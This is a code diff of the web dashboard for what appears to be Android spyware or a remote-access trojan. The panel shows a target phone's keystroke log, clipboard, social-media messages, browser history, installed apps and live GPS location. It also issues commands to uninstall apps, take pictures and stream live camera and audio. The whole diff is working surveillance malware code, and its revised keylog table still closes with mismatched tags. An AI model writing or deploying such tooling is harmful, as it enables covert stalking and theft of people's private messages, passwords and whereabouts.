+function displayInstalledApps(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Apps</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`; document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg})); document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg})); }
+function displayBrowserHistory(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Browser History</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${escapeHtml(item.date||item.timeFmt||'')}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`; }
 function displayWifiNetworks(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Wi-Fi</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>${data.map(n=>{ const bars=n.rssi>-50?'████':n.rssi>-70?'███░':n.rssi>-80?'██░░':'█░░░'; return `<tr${n.connected?' style="background:#f0fff4"':''}><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td></tr>`; }).join('')}</tbody></table></div>`; }
 function displayAppUsage(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Screen Time</h3><p>No data.</p>'; return; } const max=Math.max(...data.map(a=>a.totalTimeMs||0)); panel.innerHTML=`<h3>Screen Time</h3>${data.map(app=>{ const t=app.totalTimeMs||0; const pct=max?Math.round(t/max*100):0; return `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(app.appName||app.packageName)}</div><div class="usage-bar-container"><div class="usage-bar" style="width:${pct}%; background-color:${t>3600000?'#d32f2f':t>1800000?'#ff9800':'#4caf50'}"></div></div><div class="app-usage-time">${formatDuration(t)}</div></div>`; }).join('')}</div>`; }
-function displayKeylog(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Keylog</h3><p>None.</p>'; return; } panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>Keylog (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;">Clear</button></div><div style="overflow-x:auto;"><td><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<td>${escapeHtml(e.timeFmt||'')}</td><td>${escapeHtml((e.pkg||'').split('.').pop())}</td><td>${escapeHtml(e.text||e.key||'')}</td>`).join('')}</tbody></table></div>`; document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG')); }
+function displayKeylog(data){ if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>Keylog</h3><p>None.</p>'; return; } panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>Keylog (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${escapeHtml(e.timeFmt||'')}</td><td>${escapeHtml((e.pkg||'').split('.').pop())}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></tr></div>`; document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG')); }
 function displayClipboard(data){ const content=data&&data.content?data.content:(data||''); panel.innerHTML=`<h3>Clipboard</h3><div style="padding:16px; background:#f8fafc;">${escapeHtml(content)}</div><p>Captures copied text.</p>`; }
 function displaySocialMessages(data){ let msgs=typeof data==='string'?JSON.parse(data):data; if(!Array.isArray(msgs)||!msgs.length){ panel.innerHTML='<h3>Social Messages</h3><p>None.</p>'; return; } panel.innerHTML=`<h3>Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">`+msgs.slice().reverse().map(m=>`<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app||'Unknown')}</strong> <small>${m.timeFmt||''}</small></div><div>${escapeHtml(m.title||'')}</div><div>${escapeHtml(m.text||m.body||'')}</div></div>`).join('')+`</div>`; }
 function renderMap(loc){ let l=typeof loc==='string'?JSON.parse(loc):loc; const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10; currentLocation={lat,lon,acc}; panel.innerHTML=`<div id="map" style="height:380px;"></div><div class="map-info">📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>🎯 Accuracy: ${acc.toFixed(1)}m</div>`; if(mapInstance)mapInstance.remove(); mapInstance=L.map('map').setView([lat,lon],18); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance); L.circle([lat,lon],{radius:acc,color:'#1976ff',fillOpacity:0.2}).addTo(mapInstance); L.marker([lat,lon]).addTo(mapInstance).bindPopup('Device Location'); }
@@ -751,7 +1001,7 @@ function setupEvents(){
     document.getElementById('clickPictureBtn').onclick=()=>document.getElementById('clickCameraPanel').classList.toggle('show');
     document.getElementById('capturePictureBtn').onclick=capturePicture;
     document.getElementById('liveCameraBtn').onclick=()=>document.getElementById('liveCameraPanel').classList.toggle('show');
-    document.getElementById('startLiveStreamBtn').onclick=startLiveCamera;
+    document.getElementById('startLiveStreamBtn').onclick=startLiveStream;
     document.getElementById('liveAudioBtn').onclick=startLiveAudio;
     document.getElementById('stopLiveAudioBtn').onclick=stopLiveAudio;
     document.getElementById('getLocationBtn').onclick=()=>sendCommand('GET_LOCATION');
